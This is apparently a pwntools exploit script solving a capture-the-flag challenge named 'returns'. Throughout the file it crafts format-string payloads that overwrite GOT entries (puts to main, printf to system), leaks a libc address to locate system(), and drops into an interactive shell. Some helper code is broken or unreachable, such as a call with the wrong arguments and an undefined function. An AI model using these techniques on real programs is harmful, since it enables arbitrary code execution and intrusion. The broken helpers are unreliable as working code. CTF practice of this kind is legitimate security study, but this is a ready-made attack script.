 #!/usr/bin/env python
from pwn import *


def exploit():
    # Function addresses:
    # puts() -> main()
    addr_puts_got = 0x404018
    addr_main = 0x4011a6

    # printf() -> system()
    addr_printf_got = 0x404038
    addr_fgets_got = 0x404040

    #########################################################
    def form_fuzzing(start, end):
        return 'ABCDabcd/' + '-'.join(['%00$lx'.replace('00', str(x)) for x in range(start, end+1)])

    def form_attack_ln(addr_victim, addr_override, offset):
        payload = ''

        # Format string to print bytes
        count_to_print = addr_override  # replacement function address
        payload += '%@$0p'.replace('0', str(count_to_print - len(payload)))

        # Format string to write to the address (@ is a placeholder)
        payload += '%@$ln'
        #payload += '-%@$lp-'  # test

        # We have written some stuff to the buffer,
        # the offset of 8 to the start of the buffer
        # We need to calculate the new index which points
        # to the address
        add_index = 4
        assert (len(payload) <= (add_index * 8))

        # Here, we will replace the placeholder @@ with the buffer index
        payload = payload.replace('@', str(offset + add_index))

        # We want to make the prior payload string to multiples
        # of 8 bytes. This is so our address will be aligned nicely
        payload = payload.ljust(add_index * 8)
        
        # Finally, write the target address
        payload += p64(addr_victim)

        return payload

    def form_attack_n_custom(addr_victim_low, addr_victim_high, 
                             count_to_print_low, count_to_print_high,
                             offset):
        payload = ''

        # Format string to write to the address (@, * is a placeholder)
        if count_to_print_low == 0:
            assert len(payload) == 0
            payload += '%@$n'
            payload += '%0p'.replace('0', str(count_to_print_high))
            payload += '%*$n'
        elif count_to_print_high == 0:
            assert len(payload) == 0
            payload += '%*$n'
            payload += '%0p'.replace('0', str(count_to_print_low))
            payload += '%@$n'

        elif count_to_print_low < count_to_print_high:
            payload += '%0p'.replace('0', str(count_to_print_low - len(payload)))
            payload += '%@$n'

            payload += '%0p'.replace('0', str(count_to_print_high - count_to_print_low))
            payload += '%*$n'

        elif count_to_print_low > count_to_print_high:
            payload += '%0p'.replace('0', str(count_to_print_high - len(payload)))
            payload += '%*$n'

            payload += '%0p'.replace('0', str(count_to_print_low - count_to_print_high))
            payload += '%@$n'

        else:
            raise Exception('should not reach here')

        #payload = payload.replace('n', 'lx')
        # We have written some stuff to the buffer,
        # the offset of 8 to the start of the buffer
        # We need to calculate the new index which points
        # to the address
        add_index = 4
        assert (len(payload) <= (add_index * 8))

        # Here, we will replace the placeholder @(LOW), *(HIGH) with the buffer index
        payload = payload.replace('@', str(offset + add_index))
        payload = payload.replace('*', str(offset + add_index + 1))

        # We want to make the prior payload string to multiples
        # of 8 bytes. This is so our address will be aligned nicely
        payload = payload.ljust(add_index * 8)
        
        # Finally, write the target address
        payload += p64(addr_victim_low) ## LSB
        payload += p64(addr_victim_high)

        return payload
    
    def form_attack_n(addr_victim, addr_override, offset):
        addr_victim_low = addr_victim
        addr_victim_high = addr_victim + 4

        # Format string to print bytes
        count_to_print_low = addr_override & 0xFFFFFFFF
        count_to_print_high = (addr_override >> 32) & 0xFFFFFFFF

        form_attack_n_custom(addr_victim_low, addr_victim_high, 
            count_to_print_low, count_to_print_high, addr_override, offset)

    def form_attack_hn(addr_victim, addr_override, offset):
        payload = ''

        addr_victim_N0 = addr_victim
        addr_victim_N1 = addr_victim + 2
        addr_victim_N2 = addr_victim + 4
        addr_victim_N3 = addr_victim + 6

        # Format string to print bytes
        count_to_print_N0 = addr_override & 0xFFFFFF
        count_to_print_N1 = (addr_override >> 16) & 0xFFFF
        count_to_print_N2 = (addr_override >> 32) & 0xFFFF
        count_to_print_N3 = (addr_override >> 48) & 0xFFFF

        count_to_print = sorted([
            count_to_print_N0, count_to_print_N1,
            count_to_print_N2, count_to_print_N3
        ])

        diff_to_print = [
            count_to_print[0],
            count_to_print[1] - count_to_print[0],
            count_to_print[2] - count_to_print[1],
            count_to_print[3] - count_to_print[2]
        ]

        for i, diff in enumerate(diff_to_print):
            if diff != 0:
                payload += '%0p'.replace('0', str(diff))

            if count_to_print[i] == count_to_print_N0:
                payload += '%@$n'.replace('@', 'N0')
            elif count_to_print[i] == count_to_print_N1:
                payload += '%@$n'.replace('@', 'N1')
            elif count_to_print[i] == count_to_print_N2:
                payload += '%@$n'.replace('@', 'N2')
            elif count_to_print[i] == count_to_print_N3:
                payload += '%@$n'.replace('@', 'N3')

        # We have written some stuff to the buffer,
        # the offset of 8 to the start of the buffer
        # We need to calculate the new index which points
        # to the address
        add_index = 4
        assert (len(payload) <= (add_index * 8))

        # Here, we will replace the placeholder with the buffer index
        payload = payload.replace('N0', str(offset + add_index))
        payload = payload.replace('N1', str(offset + add_index + 1))
        payload = payload.replace('N2', str(offset + add_index + 2))
        payload = payload.replace('N3', str(offset + add_index + 3))

        # We want to make the prior payload string to multiples
        # of 8 bytes. This is so our address will be aligned nicely
        payload = payload.ljust(add_index * 8)
        
        # Finally, write the target address
        payload += p64(addr_victim_N0)
        payload += p64(addr_victim_N1)
        payload += p64(addr_victim_N2)
        payload += p64(addr_victim_N3)

        return payload

    #########################################################
    # Strangely, the final byte before the null byte was truncated.
    # ie. \x18\x40\x40\x00 is the address, but \x18\x40 
    # gets called when I do some debugging. 
    # I assume it was due to fgets() removing that final byte.
    # As in the code:
    #    fgets(item, 50, stdin);
    #    item[strlen(item)-1] = 0;
    # To fix, change the first instance of null byte to a \xFF
    def fix_ctf_code_for_null_byte(payload):
        return payload.replace('\x00', '\xFF', 1)

    #########################################################
    core = Coredump('./core')
    p = process("./returns")
    #p = remote("shell.actf.co", 19307)

    offset = 8

    # Attack 1: Overwrite puts() -> main()
    print(p.recvuntil("What item would you like to return?"))
    payload = form_attack_ln(addr_puts_got, addr_main, offset)

    # Attack 2: Leak <__libc_start_main+235> at offset 17
    extra_payload = '[%@$lp]'.replace('@', str(17))
    payload = payload.replace(' '*len(extra_payload), extra_payload)
    
    # Send to executable
    payload = fix_ctf_code_for_null_byte(payload)
    print('@ Payload 1: ' + payload)
    print('@ Payload 1 Length: ' + str(len(payload)))
    p.sendline(payload)

    # Calculate libc base and system
    result = p.recvuntil("What item would you like").replace(' '*10, '')
    print(result)

    leaked_addr = result.split('[')[1].split(']')[0]
    leaked_addr = int(leaked_addr, 16)
    print("@ Leaked: " + hex(leaked_addr))

    addr_libc_start_main = leaked_addr - 235
    print("@ __libc_start_main: " + hex(addr_libc_start_main))

    #addr_libc_base = addr_libc_start_main - 0x01aa50

    addr_system = addr_libc_start_main + 0x20ca0
    #addr_system = addr_libc_start_main + 0x3b6f0
    print("@ system: " + hex(addr_system))

    #addr_system = 0xdedeadbeef & 0x7FFFFFFF7FFFFFFF
    # print(p.recvuntil("What item would you like to return?").replace(' '*10, ''))

    # let's say I want to write 0x7f9ef245bc50 in 2 operations.
    # My initial method of using 32 bits at a time will fail
    # (ie. writing 0x7f9e and 0xf245bc50).
    # This is because 0xf245bc50 is larger than signed 32-bit integer.
    ### payload = form_attack_n(addr_printf_got, addr_system, offset)


    # Write 24 bits? 0x7f9ef2 and 0x45bc50    
    #addr_system_op1 = addr_system & 0xFFFFFF
    #addr_system_op2 = (addr_system >> 24) & 0xFFFFFF

    # Rather, let's write it such that: 0x7f9ef245 and 0xbc50    
    addr_system_op1 = addr_system & 0xFFFF
    addr_system_op2 = (addr_system >> 16) & 0xFFFFFFFF
    payload = form_attack_n_custom(
        addr_printf_got, addr_printf_got + 2,
        addr_system_op1, addr_system_op2,
        offset)

    #payload = form_fuzzing(6, 10)
    payload = fix_ctf_code_for_null_byte(payload)
    print('@ Payload 2: ' + payload)
    print('@ Payload 2 Length: ' + str(len(payload)))
    p.sendline(payload)

    result = p.recvuntil("What item would you like").replace(' '*10, '')
    print(result)

    p.sendline('ls -la')

    p.interactive()
    quit()
    print()

    #payload = 
    payload = '-'.join(['%00$lx'.replace('00', str(x)) for x in range(16, 25+1)])
    #payload = '-'.join(['%00$lx'.replace('00', str(x)) for x in range(0, 10)])
    #payload = '%16$lx'
    p.sendline(payload)

    p.recvuntil("take your ")
    leaked_addr = p.recvuntil(" ").strip()
    print("payload: " + payload)
    print("Leaked: " + leaked_addr)
    quit()
    addr_libc_base = int(leaked_addr, 16) - 235

    print("Found base: " + hex(addr_libc_base))

    #addr_libc_base = 0x00007ffff7e78b80
    # server
    #addr_system_libc = addr_libc_base + 0x45390  # calculate system libc

    # local
    addr_system_libc = addr_libc_base + 0x043980# 0x03e980  # calculate system libc

    #payload += p64(addr_puts_got + 0xFF000000)
    print(p.recvuntil("What item would you like to return?").replace(' '*10, ''))
    payload = form_attack(addr_printf_got, addr_system_libc)
    p.sendline(payload)

    p.interactive()

    # 

    #print(payload)

exploit()
